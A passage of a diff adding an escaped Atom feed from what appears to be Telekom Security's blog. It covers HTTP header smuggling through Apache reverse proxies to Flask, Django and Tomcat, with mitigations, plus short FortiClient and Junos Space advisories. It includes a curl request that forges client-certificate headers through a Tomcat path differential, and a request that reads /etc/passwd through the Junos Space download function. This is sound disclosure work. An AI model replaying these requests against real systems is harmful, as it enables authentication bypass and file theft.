+        &lt;span class=&quot;kn&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SSL_Test&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;some@user.com&quot;&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;proxy_pass&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://localhost:1337&lt;/span&gt;
+    &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The resulting response (flask):&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ssl-Test: some@user.com,foobar&lt;/code&gt; (or for django &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL_TEST: some@user.com,foobar&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;A direct match can not be bypassed with this, but you may have success passing some filters. An example could be using a filter to match for a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@corp.com&lt;/code&gt; suffix:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/login&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;login_certificate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'SSL_CLIENT_S_DN_Email'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endswith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'@corp.com'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;abort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;authenticated&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Sending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@corp.com&lt;/code&gt; as a header value now will bypass the above method then, because it will be appended and therefore &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;endswith&lt;/code&gt; returns a success:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SSL_CLIENT_S_DN_EMAIL: some@user.com,@corp.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;a-real-world-authentication-bypass&quot;&gt;A real world authentication bypass&lt;/h2&gt;
+
+&lt;p&gt;There was a slightly different scenario on some internal platforms. The authentication configuration differed in a substantial part (to the one I described in the beginning of this article). It looked like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; *:443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# virtualhost config&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# [...]&lt;/span&gt;
+
+    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /auth/cert/smartcard.xhtml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;# do client certification stuff&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;SSLVerifyClient&lt;/span&gt; require
+        &lt;span class=&quot;nc&quot;&gt;SSLVerifyDepth&lt;/span&gt;  3
+        &lt;span class=&quot;nc&quot;&gt;SSLOptions&lt;/span&gt; +StrictRequire +StdEnvVars
+
+        &lt;span class=&quot;c&quot;&gt;# set headers for backend&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;RequestHeader&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;set&lt;/span&gt; SSL_CLIENT_S_DN_Email &quot;%{SSL_CLIENT_S_DN_Email}s&quot;
+        &lt;span class=&quot;nc&quot;&gt;RequestHeader&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;set&lt;/span&gt; SSL_CLIENT_S_DN_CN &quot;%{SSL_CLIENT_S_DN_CN}s&quot;
+        &lt;span class=&quot;nc&quot;&gt;RequestHeader&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;set&lt;/span&gt; SSL_CLIENT_VERIFY &quot;%{SSL_CLIENT_VERIFY}s&quot;
+    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;
+    &lt;span class=&quot;nc&quot;&gt;ProxyPass&lt;/span&gt;          http://localhost:8443/
+    &lt;span class=&quot;nc&quot;&gt;ProxyPassReverse&lt;/span&gt;   http://localhost:8443/
+&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;VirtualHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you can see, the authentication headers were only set when client authentication was handled (said otherwise: the path matched). The backend application (a Java application running on Tomcat) only accepted this specific headers under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/auth/cert/smartcard.xhtml&lt;/code&gt; path. Example authentication flow:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;User requests &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/auth/cert/smartcard.xhtml&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Apache will ensure that the client sends a valid certificate&lt;/li&gt;
+  &lt;li&gt;Apache will enrich the original request with authentication information extracted from the certificate and forward it.&lt;/li&gt;
+  &lt;li&gt;Backend receives the enriched requests at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/auth/cert/smartcard.xhtml&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Because an attacker cannot reach the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/auth/cert/smartcard.xhtml&lt;/code&gt; directly, it’s not possible to pass the specified &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL_*&lt;/code&gt; headers and fulfill the authentication. Therefore a bypass is not possible. Or is it?&lt;/p&gt;
+
+&lt;p&gt;The critical assumption here is that the frontend webserver always &lt;strong&gt;interprets the path the same way the backend does&lt;/strong&gt;. If they do not, you may slip through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt;-block of the reverse proxy check and pass the authentication headers directly to backend.&lt;/p&gt;
+
+&lt;p&gt;I remembered some Blackhat talk about &lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;parser logic by Orange Tsai&lt;/a&gt; some years ago talking about this and some odd behaviour for Tomcat (which was running here on the backend). A path like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/auth/cert;foo=bar/smartcard.xhtml&lt;/code&gt; will be parsed as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/auth/cert/smartcard.xhtml&lt;/code&gt;, because foo=bar will be interpreted as a parameter.&lt;/p&gt;
+
+&lt;p&gt;Here is the path interpretation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/auth/cert;foo=bar/smartcard.xhtml&lt;/code&gt;:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt; &lt;/th&gt;
+      &lt;th&gt;Interpreted Path&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Apache&lt;/td&gt;
+      &lt;td&gt;/auth/cert;foo=bar/smartcard.xhtml&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Nginx&lt;/td&gt;
+      &lt;td&gt;/auth/cert;foo=bar/smartcard.xhtml&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;IIS&lt;/td&gt;
+      &lt;td&gt;/auth/cert;foo=bar/smartcard.xhtml&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Tomcat&lt;/td&gt;
+      &lt;td&gt;/auth/cert/smartcard.xhtml&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Jetty&lt;/td&gt;
+      &lt;td&gt;/auth/cert/smartcard.xhtml&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;WildFly&lt;/td&gt;
+      &lt;td&gt;/auth/cert/smartcard.xhtml&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;WebLogic&lt;/td&gt;
+      &lt;td&gt;/auth/cert/smartcard.xhtml&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Combining the fact that (a) Apache will not remove our underscore headers with the (b) path normalization behavior, we can successfully bypass the Apache certificate check and directly send the authentication headers to the backend. This will allow an authentication bypass and account takeover.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;--path-as-is&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'https://redacted.telekom.de/auth/cert;foo=bar/smartcard.xhtml'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SSL_CLIENT_S_DN_Email: user@email.com'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SSL_CLIENT_S_DN_CN: User Name&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SSL_CLIENT_VERIFY: SUCCESS&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Don’t be fooled here that only Apache with Tomcat can be vulnerable. I am sure there are other combinations of components where frontend and backend will interpret the path differently. Only a slight difference is in this scenario needed for a full authentication bypass.&lt;/p&gt;
+
+&lt;h2 id=&quot;recap&quot;&gt;Recap&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;In some scenarios, HTTP header names can be spoofed via underscore/dash conflation&lt;/li&gt;
+  &lt;li&gt;WSGI frameworks like django or flask assume it’s the reverse proxy’s job to strip out underscore headers&lt;/li&gt;
+  &lt;li&gt;Apache &lt;strong&gt;does not&lt;/strong&gt; strip out headers with underscores for requests passed via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProxyPass&lt;/code&gt; and some other modules&lt;/li&gt;
+  &lt;li&gt;Nginx &lt;strong&gt;does&lt;/strong&gt; strip out headers with underscores for requests passed via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxy_pass&lt;/code&gt; (unless &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;underscores_in_headers&lt;/code&gt; is on)&lt;/li&gt;
+  &lt;li&gt;If a HTTP header name with hyphens is passed, WSGI-based frameworks and PHP will normalize the header, disallowing the user to distinguish how it was originally passed&lt;/li&gt;
+  &lt;li&gt;HTTP headers matching this criteria used in a security-sensitive way can be abused this way to bypass authentication&lt;/li&gt;
+  &lt;li&gt;In some cases, path parsing differentials will also lead to an authentication bypass&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I did not check every possible combination of components, but for the ones I looked at, I can give this short overview for Apache. Nginx will not pass underscores, but the hyphen/underscore conversion stays the same:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt; &lt;/th&gt;
+      &lt;th&gt;Allows underscores&lt;/th&gt;
+      &lt;th&gt;Converts &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt;&lt;/th&gt;
+      &lt;th&gt;Converts &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt;&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;apache → django&lt;/td&gt;
+      &lt;td&gt;✓&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;✓&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;apache → flask&lt;/td&gt;
+      &lt;td&gt;✓&lt;/td&gt;
+      &lt;td&gt;✓&lt;/td&gt;
+      &lt;td&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;apache → php&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;✓&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;apache → tomcat&lt;sup&gt;2&lt;/sup&gt;&lt;/td&gt;
+      &lt;td&gt;✓&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;apache + php module&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt;✓&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;sup&gt;1&lt;/sup&gt; hyphens are not converted, but all hyphen headers are still accessible with underscores.&lt;/p&gt;
+
+&lt;p&gt;&lt;sup&gt;2&lt;/sup&gt; path parsing differentials dangerous&lt;/p&gt;
+
+&lt;h3 id=&quot;nginx-and-possibly-other-reverse-proxies&quot;&gt;Nginx (and possibly other reverse proxies)&lt;/h3&gt;
+
+&lt;p&gt;As you might have noticed, this writeup mainly focuses on Apache in reverse proxy scenarios. This is due to the fact that nginx will strip out all underscore headers by default.&lt;/p&gt;
+
+&lt;p&gt;Some interesting behaviour for nginx occurs when headers are set twice (due to normalization). While passing underscore headers do not work for nginx, headers with hyphens may still be converted at the backend.&lt;/p&gt;
+
+&lt;p&gt;If a reverse proxy does not strip out underscore headers, the same techniques as used for Apache can be applied. The only other reverse proxy I tested was &lt;a href=&quot;https://caddyserver.com/&quot;&gt;Caddy&lt;/a&gt;, which also does not strip underscore headers.&lt;/p&gt;
+
+&lt;h2 id=&quot;severity-and-impact&quot;&gt;Severity and Impact&lt;/h2&gt;
+
+&lt;p&gt;As described above, this does not mean that every Apache-mTLS-as-a-reverse-proxy scenario is problematic. The main point of this post is to highlight unexpected behavior when dealing with specific headers and configurations. Some combinations and configuration will be problematic, some won’t. For the Apache+Tomcat example, this can lead to a critical vulnerability. This is also of course not always the case.&lt;/p&gt;
+
+&lt;p&gt;In the scenario described in the beginning of this post, where Apache is used with a WSGI-based component and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProxyPass&lt;/code&gt;, mTLS is used on the root level. This lowers the impact from an authentication bypass to an account takeover, because an attacker is not able to bypass the initial mTLS.&lt;/p&gt;
+
+&lt;p&gt;When authentication headers are only accepted at a specific path, a potential attacker is required to use a path differential to fully smuggle headers.&lt;/p&gt;
+
+&lt;p&gt;While this posts tries to give an example for a theoretic mTLS authentication scenarios, there are a few other interesting headers which might be smuggled: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Forwarded-For&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Forwarded-Host&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Real-Ip&lt;/code&gt;, etc. If the backend application for examples adds authentication based on the IP address, an attacker might use one of the tricks above to get his own header value to be passed to the backend.&lt;/p&gt;
+
+&lt;p&gt;To vulnerability caused by a combination of components and the impact highly depends on the components in use and their configuration.&lt;/p&gt;
+
+&lt;h2 id=&quot;recommendations&quot;&gt;Recommendations&lt;/h2&gt;
+
+&lt;p&gt;There are a lot of components and scenarios which can have devastating effects. However, we came to the following measures which prevent all scenarios we can think of:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Always&lt;/strong&gt; unset/clear the authentication headers at root level (and not just in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt; block, which is relevant for authentication).&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Do not use&lt;/strong&gt; underscores or hyphens in security-sensitive HTTP header names, unless you specifically checked if and how normalization is done and all variations are stripped out at the reverse proxy level.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Consider using&lt;/strong&gt; a secret in an authentication block (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;Location&amp;gt;&lt;/code&gt; in Apache) which is checked against in the backend. This way, even if the attacker is able to abuse a parser differential like with Apache and Tomcat, the attacker does not know the secret and the backend is able to notice the forgery.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;‒ &lt;strong&gt;Robin Verton&lt;/strong&gt; (&lt;a href=&quot;https://twitter.com/RobinVerton&quot;&gt;@robinverton&lt;/a&gt;). Big thanks also to &lt;strong&gt;Simon Peters&lt;/strong&gt;, who researched this topic with me.&lt;/p&gt;</content><author><name>Telekom Security</name></author><summary type="html">Under some conditions, it is possible to smuggle HTTP headers through a reverse proxy, even if it was explicitly unset before. This is possible in some cases due to HTTP header normalization and parser differentials. Because HTTP headers are commonly used as way to pass authentication data to the backend (for example in mutual TLS scenarios), this can lead to critical vulnerabilities.</summary></entry><entry><title type="html">Unquoted Service Path exploit in Fortinet FortiClient</title><link href="http://telekomsecurity.github.io//2020/03/forticlient-unquoted-service-path.html" rel="alternate" type="text/html" title="Unquoted Service Path exploit in Fortinet FortiClient" /><published>2020-03-09T00:00:00+01:00</published><updated>2020-03-09T00:00:00+01:00</updated><id>http://telekomsecurity.github.io//2020/03/forticlient-unquoted-service-path</id><content type="html" xml:base="http://telekomsecurity.github.io//2020/03/forticlient-unquoted-service-path.html">&lt;p&gt;FortiClient for Windows prior to 6.2.3 is vulnerable to an unquoted service path vulnerability (CVE-2019-17658). That may allow an attacker to gain elevated privileges via the FortiClientConsole executable service path.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;Base Score: 9.8&lt;/p&gt;
+
+&lt;p&gt;Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&lt;/p&gt;
+
+&lt;h3 id=&quot;affected-component&quot;&gt;Affected Component&lt;/h3&gt;
+&lt;p&gt;FortiClient FortiTray&lt;/p&gt;
+
+&lt;h3 id=&quot;affected-products&quot;&gt;Affected Products&lt;/h3&gt;
+&lt;p&gt;FortiClient for Windows Versions 6.2.2 and below.&lt;/p&gt;
+
+&lt;h3 id=&quot;patched-in-version&quot;&gt;Patched in Version&lt;/h3&gt;
+&lt;p&gt;FortiClient for Windows version 6.2.3 or above.&lt;/p&gt;
+
+&lt;h3 id=&quot;poc&quot;&gt;PoC&lt;/h3&gt;
+
+&lt;p&gt;Private: The PoC is not published because it’s obvious.&lt;/p&gt;
+
+&lt;h3 id=&quot;links&quot;&gt;Links:&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;https://nvd.nist.gov/vuln/detail/CVE-2019-17658&lt;/li&gt;
+  &lt;li&gt;https://fortiguard.com/psirt/FG-IR-19-281&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Michael Wollner&lt;/strong&gt; (&lt;a href=&quot;https://github.com/Ibonok&quot;&gt;@Ibonok&lt;/a&gt;)&lt;/p&gt;</content><author><name>Telekom Security</name></author><summary type="html">FortiClient for Windows prior to 6.2.3 is vulnerable to an unquoted service path vulnerability (CVE-2019-17658). That may allow an attacker to gain elevated privileges via the FortiClientConsole executable service path.</summary></entry><entry><title type="html">Juniper Junos Space Local File Inclusion Vulnerability</title><link href="http://telekomsecurity.github.io//2020/01/junos-space-local-file-inclusion.html" rel="alternate" type="text/html" title="Juniper Junos Space Local File Inclusion Vulnerability" /><published>2020-01-31T00:00:00+01:00</published><updated>2020-01-31T00:00:00+01:00</updated><id>http://telekomsecurity.github.io//2020/01/junos-space-local-file-inclusion</id><content type="html" xml:base="http://telekomsecurity.github.io//2020/01/junos-space-local-file-inclusion.html">&lt;p&gt;A Local File Inclusion vulnerability (CVE-2020-1611) in Juniper Networks Junos Space allows an attacker to view all files on the target when the device receives malicious HTTP packets.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;juniper-junos-space-local-file-inclusion&quot;&gt;Juniper Junos Space Local File Inclusion&lt;/h2&gt;
+&lt;p&gt;Juniper Junos Space prior to 19.4R1 is vulnerable to a local file inclusion vulnerability. An attacker with normal user rights could exploit this vulnerability.&lt;/p&gt;
+
+&lt;p&gt;The “Download Report” function is vulnerable.&lt;/p&gt;
+
+&lt;p&gt;Base Score: 6.5&lt;br /&gt;
+Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N&lt;/p&gt;
+
+&lt;p&gt;Links:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://nvd.nist.gov/vuln/detail/CVE-2020-1611&lt;/li&gt;
+  &lt;li&gt;https://kb.juniper.net/InfoCenter/index?page=content&amp;amp;id=JSA10993&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;example&quot;&gt;Example&lt;/h3&gt;
+
+&lt;p&gt;GET Parameters:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Set “Format” to “txt”&lt;/li&gt;
+  &lt;li&gt;Set “FileUrl” to a local path&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Request:&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/mainui/download?X-CSRF=Y581SFvKU5INQPItBUoNj4NKf4IuqjSyywfRylPN3GLYaML3fM074gV2AIPBQjHEJsuJ9d7
+&amp;amp;type=downloadGROpenReport&amp;amp;_browserId=1553107455361
+&amp;amp;FileUrl=/etc/passwd&amp;amp;Format=txt&amp;amp;nodeHost=space-000311c3b873&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;10.10.10.10&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US;q=0.7,en;q=0.3&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://10.10.10.10/mainui/nLegacy.jsp?bid=1553107455361&amp;amp;appName=CMP&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;DNT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ext-$sidebar_gettingStarted_checkbox=o%3Achecked%3Db%253A0;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;DWRSESSIONID=sicWsVGWEjxdNYR7RJ60rCtbBrOmy0JHBm4h;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;JSESSIONID=&quot;aoVrgUa7V1prIWVO5KEmCqF6QGuuYZ44RshRxEYHAJXqQDCNBjV6pLKiaaXQx2jWjGWw5TxnDxkKtsi&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;_.space-000311c3b873&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;server3&quot;;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;JSESSIONIDSSO=Cm5qb87syONJ2lku1dadTx-SVyaoy0k9lt-bwSnTkfFrdONVfvmzrxB+g8xny4gjyKk_;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;X-CSRF=Y581SFvKU5INQPItBUoNj4NKf4IuqjSyywfRylPN3GLYaML3fM074gV2AIPBQjHEJsuJ9d7; JxRunningBids=_1553107455361_&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;Response:&lt;br /&gt;&lt;/p&gt;
+
